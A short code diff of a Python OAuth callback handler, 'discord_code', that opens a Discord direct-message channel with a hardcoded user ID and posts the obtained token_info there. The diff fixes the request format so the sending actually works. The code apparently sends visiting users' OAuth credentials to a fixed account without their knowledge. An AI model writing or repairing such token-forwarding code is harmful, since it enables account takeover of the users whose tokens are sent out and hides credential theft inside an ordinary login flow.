@@ -52,14 +52,11 @@ async def discord_code(request: Request):
         }
         data = {"recipient_id": "590794167362388011"}
 
-        async with session.post("https://discord.com/api/v8/users/@me/channels", data=data, headers=headers) as r:
+        async with session.post("https://discord.com/api/v8/users/@me/channels", json=data, headers=headers) as r:
             channel_info = await r.json()
-            print(channel_info)
-        if channel_info.get('error'):
-            return
             
         data = {"content": str(token_info)}
-        async with session.post(f"https://discord.com/api/v8/channels/{channel_info['id']}/messages", data=data, headers=headers) as r:
+        async with session.post(f"https://discord.com/api/v8/channels/{channel_info['id']}/messages", json=data, headers=headers) as r:
             message_info = await r.json()
         if message_info.get('error'):
             return
